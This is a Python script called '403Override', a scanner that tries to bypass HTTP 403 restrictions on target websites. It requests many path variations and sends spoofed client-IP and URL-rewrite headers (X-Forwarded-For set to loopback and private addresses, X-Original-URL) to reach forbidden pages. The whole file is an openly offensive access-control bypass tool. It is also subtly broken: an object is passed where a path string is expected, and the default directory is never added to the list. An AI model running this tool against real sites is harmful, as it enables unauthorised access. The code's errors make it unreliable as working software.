import requests
import sys
import argparse
import validators
import os
import tldextract
import json
import asyncio
import aiohttp
from colorama import init, Fore, Style
from pyfiglet import Figlet

# INITIALISE COLORAMA
init()

# Display Banner -- Start
custom_fig = Figlet(font='slant')
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('403Override') + Style.RESET_ALL)
print(Fore.GREEN + Style.BRIGHT + "____________________ Version 1.0.1 ____________________\n")
# Display Banner -- End

# Handle Arguments -- Start
parser = argparse.ArgumentParser(description="403Override Scanner")
parser.add_argument("-u", "--url", type=str, help="Single URL to scan, ex: http://example.com")
parser.add_argument("-U", "--urllist", type=str, help="Path to list of URLs, ex: urllist.txt")
parser.add_argument("-d", "--dir", type=str, help="Single directory to scan, ex: /admin", nargs="?", const="/")
parser.add_argument("-D", "--dirlist", type=str, help="Path to list of directories, ex: dirlist.txt")
parser.add_argument("-o", "--output", type=str, help="Output format: text (default) or json", default="text")
args = parser.parse_args()
# Handle Arguments -- End


class Arguments:
    def __init__(self, url, urllist, dir, dirlist, output_format):
        self.url = url
        self.urllist = urllist
        self.dir = dir
        self.dirlist = dirlist
        self.urls = []
        self.dirs = []
        self.output_format = output_format
        
        self.checkURL()
        self.checkDir()
    
    def return_urls(self):
        return self.urls
    
    def return_dirs(self):
        return self.dirs
    
    def checkURL(self):
        if self.url:
            if not validators.url(self.url):
                print("You must specify a valid URL for -u (--url) argument! Exiting...\n")
                sys.exit()
            
            if self.url.endswith("/"):
                self.url = self.url.rstrip("/")
            
            self.urls.append(self.url)
        elif self.urllist:
            if not os.path.exists(self.urllist):
                print("The specified path to URL list does not exist! Exiting...\n")
                sys.exit()
            
            with open(self.urllist, 'r') as file:
                temp = file.readlines()
            
            for x in temp:
                self.urls.append(x.strip())
        else:
            print("Please provide a single URL or a list either! (-u or -U)\n")
            sys.exit()
    
    def checkDir(self):
        if self.dir:
            if not self.dir.startswith("/"): 
                self.dir = "/" + self.dir
            
            if self.dir.endswith("/") and self.dir != "/":
                self.dir = self.dir.rstrip("/")
            self.dirs.append(self.dir)
        elif self.dirlist:
            if not os.path.exists(self.dirlist):
                print("The specified path to directory list does not exist! Exiting...\n")
                sys.exit()
            
            with open(self.dirlist, 'r') as file:
                temp = file.readlines()
            
            for x in temp:
                self.dirs.append(x.strip())
        else:
            self.dir = "/"


class PathRepository:
    def __init__(self, path):
        self.path = path
        self.newPaths = []
        self.newHeaders = []
        self.rewriteHeaders = []
        
        self.createNewPaths()
        self.createNewHeaders()
    
    def createNewPaths(self):
        self.newPaths.append(self.path)
        
        pairs = [["/", "//"], ["/.", "/./"]]
        
        leadings = ["/%2e"]
        
        trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00",".json", ".css", ".html", "?", "??", "???","?anyparam", "#", "#anything", "/."]

        for pair in pairs:
            self.newPaths.append(pair[0] + self.path + pair[1])
        
        for leading in leadings:
            self.newPaths.append(leading + self.path)
        
        for trailing in trailings:
            self.newPaths.append(self.path + trailing)
    
    def createNewHeaders(self):
        headers_overwrite = ["X-Original-URL", "X-Rewrite-URL"]
        
        headers = ["X-Custom-IP-Authorization", "X-Forwarded-For","X-Forward-For", "X-Remote-IP", "X-Originating-IP","X-Remote-Addr", "X-Client-IP", "X-Real-IP"]

        values = ["localhost", "localhost:80", "localhost:443","127.0.0.1", "127.0.0.1:80", "127.0.0.1:443","2130706433", "0x7F000001", "0177.0000.0000.0001","0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0","172.16.0.1", "192.168.1.0", "192.168.1.1","0177.0.0.1","127.0.1","169.254-169.254"]
   
        for header in headers:
            for value in values:
                self.newHeaders.append({header : value})
        
        for element in headers_overwrite:
            self.rewriteHeaders.append({element : self.path})


class Query:
    def __init__(self, url, dir, dirObject, output_format):
        self.url = url
        self.dir = dir          # call pathrepo by this
        self.dirObject = dirObject
        self.domain = tldextract.extract(self.url).domain
        self.output_format = output_format
        self.results = []
    
    def checkStatusCode(self, status_code):
        if status_code == 200 or status_code == 201:
            colour = Fore.GREEN + Style.BRIGHT
        elif status_code == 301 or status_code == 302:
            colour = Fore.BLUE + Style.BRIGHT
        elif status_code == 403 or status_code == 404:
            colour = Fore.MAGENTA + Style.BRIGHT
        elif status_code == 500:
            colour = Fore.RED + Style.BRIGHT
        else:
            colour = Fore.WHITE + Style.BRIGHT
        
        return colour
    
    def writeToFile(self):
        if self.output_format == "text":
            with open(self.domain + ".txt", "a") as file:
                for line in self.results:
                    file.write(line + "\n")
        elif self.output_format == "json":
            json_output = json.dumps(self.results, indent=4)
            with open(self.domain + ".json", "w") as file:
                file.write(json_output)

    async def fetch_status(self, session, url, headers=None):
        async with session.get(url, headers=headers) as response:
            return await response.text(), response.status, response.content
    
    async def run(self):
        async with aiohttp.ClientSession() as session:
            await self.manipulateRequest(session)
    
    async def manipulateRequest(self, session):
        print((" Target URL: " + self.url + "\tTarget Path: " + self.dir + " ").center(121, "="))
        
        payloads = [{"X-Custom-IP-Authorization": "localhost"}, {"X-Custom-IP-Authorization": "127.0.0.1"}]  # Example payloads
        for payload in payloads:
            response_text, status_code, content = await self.fetch_status(session, self.url + self.dir, headers=payload)
            color = self.checkStatusCode(status_code)
            info = {
                "url": self.url + self.dir,
                "status_code": status_code,
                "res_size": len(content),
                "payloads": payload
            }
            self.results.append(info)
        
        await self.manipulatePath(session)
    
    async def manipulatePath(self, session):
        for path in self.dirObject.newPaths:
            response_text, status_code, content = await self.fetch_status(session, self.url + path)
            color = self.checkStatusCode(status_code)
            info = {
                "url": self.url + path,
                "status_code": status_code,
                "res_size": len(content),
                "payloads": {}
            }
            self.results.append(info)
        
        await self.manipulateHeaders(session)
    
    async def manipulateHeaders(self, session):
        for header in self.dirObject.newHeaders:
            response_text, status_code, content = await self.fetch_status(session, self.url, headers=header)
            color = self.checkStatusCode(status_code)
            info = {
                "url": self.url,
                "status_code": status_code,
                "res_size": len(content),
                "payloads": header
            }
            self.results.append(info)
        
        for header in self.dirObject.rewriteHeaders:
            response_text, status_code, content = await self.fetch_status(session, self.url, headers=header)
            color = self.checkStatusCode(status_code)
            info = {
                "url": self.url,
                "status_code": status_code,
                "res_size": len(content),
                "payloads": header
            }
            self.results.append(info)
        
        self.writeToFile()

class Program:
    def __init__(self, urls, dirs, output_format):
        self.urls = urls
        self.dirs = dirs
        self.output_format = output_format
    
    async def initialise(self):
        for url in self.urls:
            for dir in self.dirs:
                path_repo = PathRepository(dir)
                query = Query(url, path_repo, path_repo, self.output_format)
                await query.run()

if __name__ == "__main__":
    try:
        arguments = Arguments(args.url, args.urllist, args.dir, args.dirlist, args.output)
        program = Program(arguments.urls, arguments.dirs, arguments.output_format)
        asyncio.run(program.initialise())
    except KeyboardInterrupt:
        print(Fore.RED + "\nProcess interrupted by user. Exiting...\n" + Style.RESET_ALL)
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"\nAn unexpected error occurred: {e}\n" + Style.RESET_ALL)
        sys.exit(1)
